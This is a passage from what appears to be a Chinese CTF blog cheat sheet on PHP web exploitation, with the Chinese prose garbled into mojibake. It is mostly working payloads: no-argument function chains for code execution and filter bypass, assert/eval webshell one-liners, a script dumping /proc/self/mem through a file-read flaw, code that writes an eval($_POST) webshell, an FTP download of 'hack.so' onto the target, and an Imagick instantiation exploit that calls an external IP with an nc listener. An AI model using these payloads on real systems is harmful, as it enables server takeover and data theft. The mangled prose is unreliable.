¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code>ã€‚</p></li><li><p>time()</p><p>è¿”å›å½“å‰Unixæ—¶é—´æˆ³ã€‚</p></li><li><p>localtime()</p><p>å–å¾—æœ¬åœ°æ—¶é—´ã€‚</p></li><li><p>getcwd()</p><p>è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</p></li><li><p>dirname()</p><p>è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</p></li><li><p>getenv()</p><p>è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼ˆåœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°ï¼‰ã€‚</p></li><li><p>getallheaders()</p><p>è·å–å…¨éƒ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯ã€‚ï¼ˆApacheï¼‰</p></li></ul><ul><li><p>apache_request_headers()</p><p>è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯ï¼ŒåŒ…å«å½“å‰è¯·æ±‚æ‰€æœ‰å¤´ä¿¡æ¯çš„æ•°ç»„ï¼Œå¤±è´¥è¿”å› FALSEã€‚ï¼ˆApacheï¼‰</p></li><li><p>get_defined_vars()</p><p>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚ï¼ˆNginxï¼‰</p></li><li><p>get_defined_functions()</p><p>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å‡½æ•°æ‰€ç»„æˆçš„æ•°ç»„ã€‚</p></li><li><p>session_start()</p><p>å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼Œå‘Šè¯‰PHPä½¿ç”¨sessionã€‚ï¼ˆPHPé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ï¼Œé…åˆ<code>session_id()</code>ï¼‰</p></li><li><p>realpath_cache_get()</p><p>è·å¾—çœŸå®è·¯å¾„ç¼“å­˜çš„è¯¦æƒ…ã€‚</p></li><li><p>get_class()</p><p>è·å–å½“å‰è°ƒç”¨æ–¹æ³•çš„ç±»åã€‚</p></li><li><p>get_called_class()</p><p>è·å–é™æ€ç»‘å®šåçš„ç±»åã€‚</p></li><li><p>ini_get_all()</p><p>ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ•´ä¸ªphpçš„ç¯å¢ƒå˜é‡ï¼ˆé…ç½®ä¿¡æ¯ï¼‰ã€‚</p></li><li><p>__HALT_COMPILER()</p><p>ä¸­æ–­ç¼–è¯‘å™¨çš„æ‰§è¡Œã€‚ï¼ˆä¸­æ–­phpçš„æ‰§è¡Œï¼Œä¸ä¼šæ£€æŸ¥åé¢çš„è¯­å¥ï¼‰</p></li></ul><h4 id="å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰"><a href="#å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰" class="headerlink" title="å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰"></a>å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰</h4><ul><li><p>array_map()</p><p>è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„æ•°ç»„ã€‚</p><p><code>array_map(&#39;system&#39;,[&#39;ls&#39;]);</code></p></li><li><p>scandir()</p><p>åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</p><p><code>scandir(&#39;.&#39;)</code></p></li><li><p>glob()</p><p>è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚</p><p><code>print_r(glob(&quot;*&quot;));</code></p><p><code>print_r(glob(&quot;./*&quot;)[2]);</code></p></li><li><p>current()</p><p>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</p><p><code>current(localeconv()) â†’ .</code></p><p><code>?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</code></p></li><li><p>pos()</p><p>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼Œ<code>current()</code>å‡½æ•°çš„åˆ«åã€‚</p></li><li><p>next() / prev() / reset() / end()</p><p>å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½ / å€’å›ä¸€ä½ / æŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒ / æŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒã€‚</p><p><code>end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy</code> ï¼ˆé…åˆè‡ªå®šä¹‰è¯·æ±‚å¤´ç»•è¿‡å…³é”®å­—ï¼‰</p></li></ul><ul><li><p>implode() / join()</p><p>åˆå¹¶æ•°ç»„ä¸ºå­—ç¬¦ä¸²ã€‚</p></li><li><p>assert() / eval()</p><p>å‘½ä»¤æ‰§è¡Œã€‚</p><p><code>assert(phpinfo(););</code></p><p><code>assert(assert($_POST[c]));</code></p></li><li><p>chdir()</p><p>æ”¹å˜ç›®å½•ã€‚</p></li><li><p>file_get_contents()</p></li><li><p>highlight_file() / show_source()</p></li><li><p>readfile() / readgzfile()</p></li><li><p>echo()</p></li><li><p>print_r()</p></li><li><p>var_dump()</p></li><li><p>dirname()</p><p>è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</p></li><li><p>chr()</p><p>ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</p></li></ul><ul><li><p>array_pop()</p><p>å¼¹å‡ºå¹¶è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œå¹¶å°†æ•°ç»„çš„é•¿åº¦å‡ä¸€ã€‚</p></li><li><p>array_reverse()</p><p>ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</p></li><li><p>array_rand()</p><p>è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœè§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</p></li><li><p>array_flip()</p><p>ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</p></li><li><p>array_slice()</p><p>åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚</p></li><li><p>hex2bin()</p><p>è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p></li><li><p>session_id()</p><p>è·å–åˆ°å½“å‰çš„session idã€‚</p><p><code>session_id(session_start())</code></p></li><li><p>create_function()</p><p>åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaæ ·å¼ï¼‰ã€‚ä»£ç æ³¨å…¥ã€‚</p></li><li><p>hex2bin()</p><p>æŠŠåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p><p><code>hex2bin(&#39;73797374656D&#39;) -&gt; system</code></p></li></ul><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12311239.html">https://www.cnblogs.com/wangtanzhi/p/12311239.html</a></p><p>â€‹</p><h3 id="åˆ—ç›®å½•"><a href="#åˆ—ç›®å½•" class="headerlink" title="åˆ—ç›®å½•"></a>åˆ—ç›®å½•</h3><ul><li><p>SPLç›®å½•ç±»ï¼š<code>DirectoryIterator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å¯ç”¨äºçŒœè§£æ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>SPLç›®å½•ç±»ï¼š<code>FilesystemIterator</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>SPLç›®å½•ç±»ï¼š<code>GlobIterator</code></p><p>å¯é€šé…ä¾‹å¦‚<code>/var/html/www/flag*</code></p></li><li><p>scandir()</p></li><li><p>é¢å‘è¿‡ç¨‹æ–¹æ³•ï¼šopendir()ï¼Œreaddir()ï¼Œclosedir()</p></li><li><p>é¢å‘å¯¹è±¡æ–¹æ³•ï¼šPHPçš„<code>dir</code>ç±»</p><p>â€‹</p></li></ul><h3 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h3><ul><li><p>ç‰¹æ®Šæ–‡ä»¶ï¼š</p><ul><li><p>/proc/self/cmdline - åº”ç”¨è¿è¡Œçš„æ–‡ä»¶å¤¹</p></li><li><p>/proc/self/environï¼ˆ/proc/1/environï¼‰ - å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼›å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚é‡è¦çš„å±æ€§ï¼Œæ¯”å¦‚WEBæœåŠ¡çš„æƒé™</p></li><li><p>/proc/self/cwd - å½“å‰ç›®å½•</p></li><li><p>/proc/[PID]/fd/[NUM] - æ˜¯ä¸ªç›®å½•ï¼ŒåŒ…å«å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥</p></li><li><p>/proc/self/maps + /proc/self/mem</p><p>æ–‡ä»¶è¯»å–éƒ¨åˆ†å¦‚å¯ä»¥seekè¯»å–ï¼Œç¬¬ä¸€æ­¥é€šè¿‡ <code>/proc/self/maps</code> è¯»å–å †æ ˆåˆ†å¸ƒï¼Œå†è¯»å– <code>/proc/self/mem</code> çš„å†…å­˜æ•°æ®ï¼Œå†é€šè¿‡æ­£åˆ™ç­›é€‰ç¬¦åˆæ ¼å¼çš„æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">maps_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?file=/proc/self/maps&quot;</span></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span></span><br><span class="line">maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"><span class="comment"># print(maps)</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>) - <span class="built_in">int</span>(start, <span class="number">16</span>))</span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?file=/proc/self/mem&amp;offset=<span class="subst">&#123;Offset&#125;</span>&amp;length=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    rt = re.findall(<span class="string">b&quot;[a-z0-9]&#123;8&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;12&#125;&quot;</span>, s)</span><br><span class="line">    <span class="keyword">if</span> rt:</span><br><span class="line">        <span class="built_in">print</span>(rt)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file())</p></li><li><p>fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetss</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       <span class="comment">//php7.3ç‰ˆæœ¬å è¯¥å‡½æ•°å·²ä¸å†è¢«ä½¿ç”¨</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);                                     </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);                                   </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125; </span><br></pre></td></tr></table></figure></li><li><p>include() / require()</p><p>é€‚ç”¨éphpæ–‡ä»¶</p></li><li><p>SPLæ–‡ä»¶ç±»ï¼š<code>SplFileObject</code></p><p>æŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå†ã€‚é€‚é…ä¼ªåè®®ï¼Œå¦‚ <code>php://filter</code>ã€‚</p></li><li><p>Mysql</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT LOAD_FILE(&#x27;/flag.txt&#x27;) as my&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;my&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 ç»“æœ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹</p></li></ul><h3 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h3><ul><li><p>file_put_contents()</p></li><li><p>SplFileObject::fwrite()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;EV&quot;</span>, <span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;GETCONT&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>);</span><br><span class="line"><span class="comment">// ç”±äºç¦æ­¢äº†$ï¼Œä»å·²æœ‰çš„åœ°æ–¹è·å–$ç¬¦</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;D&quot;</span>,(GETCONT)(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)[<span class="number">353</span>]);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.EV.<span class="string">&quot;(&quot;</span>.D.<span class="string">&quot;_POST[&#x27;a&#x27;]);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (GETCONT)(<span class="string">&#x27;./shell.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">fwrite</span>(SHELL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;PHARA&quot;</span>, <span class="keyword">new</span> <span class="title function_ invoke__">splf</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>));</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>FTP</p><p>Pythonå¼€å¯FTPæœåŠ¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line"></span><br><span class="line">authorizer = DummyAuthorizer()</span><br><span class="line">authorizer.add_anonymous(<span class="string">&quot;./&quot;</span>)</span><br><span class="line"></span><br><span class="line">handler = FTPHandler</span><br><span class="line">handler.authorizer = authorizer</span><br><span class="line">handler.masquerade_address = <span class="string">&quot;ip&quot;</span></span><br><span class="line"><span class="comment"># æ³¨æ„è¦ç”¨è¢«åŠ¨æ¨¡å¼</span></span><br><span class="line">handler.passive_ports = <span class="built_in">range</span>(<span class="number">9998</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">server = FTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">23</span>), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>PHPä¸‹è½½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$local_file</span> = <span class="string">&#x27;/tmp/hack1.so&#x27;</span>;</span><br><span class="line"><span class="variable">$server_file</span> = <span class="string">&#x27;hack.so&#x27;</span>;</span><br><span class="line"><span class="variable">$ftp_server</span> = <span class="string">&#x27;xxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$ftp_port</span>=<span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ftp</span> = <span class="title function_ invoke__">ftp_connect</span>(<span class="variable">$ftp_server</span>,<span class="variable">$ftp_port</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$login_result</span> = <span class="title function_ invoke__">ftp_login</span>(<span class="variable">$ftp</span>, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">// æ³¨æ„è¦å¼€å¯è¢«åŠ¨æ¨¡å¼</span></span><br><span class="line"><span class="title function_ invoke__">ftp_pasv</span>(<span class="variable">$ftp</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ftp_get</span>(<span class="variable">$ftp</span>, <span class="variable">$local_file</span>, <span class="variable">$server_file</span>, FTP_BINARY)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Successfully written to <span class="subst">$local_file</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;There was a problem\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ftp_close</span>(<span class="variable">$ftp</span>);</span><br></pre></td></tr></table></figure></li></ul><p>â€‹</p><h3 id="å†…ç½®ç±»-å†…ç½®æ–¹æ³•"><a href="#å†…ç½®ç±»-å†…ç½®æ–¹æ³•" class="headerlink" title="å†…ç½®ç±»/å†…ç½®æ–¹æ³•"></a>å†…ç½®ç±»/å†…ç½®æ–¹æ³•</h3><h4 id="è¯»ç±»ä¿¡æ¯"><a href="#è¯»ç±»ä¿¡æ¯" class="headerlink" title="è¯»ç±»ä¿¡æ¯"></a>è¯»ç±»ä¿¡æ¯</h4><p><code>ReflectionClass::export()</code></p><h4 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h4><p><code>Closure::fromCallable(&quot;system&quot;)(&quot;whoami&quot;);</code></p><p>â€‹</p><h3 id="new-åŸç”Ÿç±»"><a href="#new-åŸç”Ÿç±»" class="headerlink" title="new+åŸç”Ÿç±»"></a>new+åŸç”Ÿç±»</h3><ul><li><p><code>eval(&quot;echo new $a($b);&quot;);</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=Exception&amp;b=system(&#x27;whoami&#x27;)</span><br><span class="line">?a=SplFileObject&amp;b=system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></li><li><p><code>echo new $a($b);</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åˆ—ç›®å½•</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://f*</span><br><span class="line"></span><br><span class="line">è¯»æ–‡ä»¶</span><br><span class="line">?a=SplFileObject&amp;b=1.php</span><br><span class="line">?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=1.php</span><br></pre></td></tr></table></figure></li><li><p><code>new $a($b);</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=Imagick&amp;b=http://121.40.253.177:7777</span><br><span class="line">nc -lvnp 7777</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§æ–‡ä¸­çš„POCï¼Œåœ¨VPSä¸­ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡ï¼Œå«æœ‰ä¸€å¥è¯æœ¨é©¬ï¼š</p><p><code>convert xc:red -set &#39;Copyright&#39; &#39;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#39; positiv e.png</code></p><p>åœ¨VPSä¸­ç›‘å¬12345ç«¯å£ï¼Œå†å¾€æœåŠ¡å™¨å‘é€è¯·æ±‚åŒ…å¦‚ä¸‹ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?b=Imagick&amp;c=vid:msl:/tmp/php*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.1.1.1:32127</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: 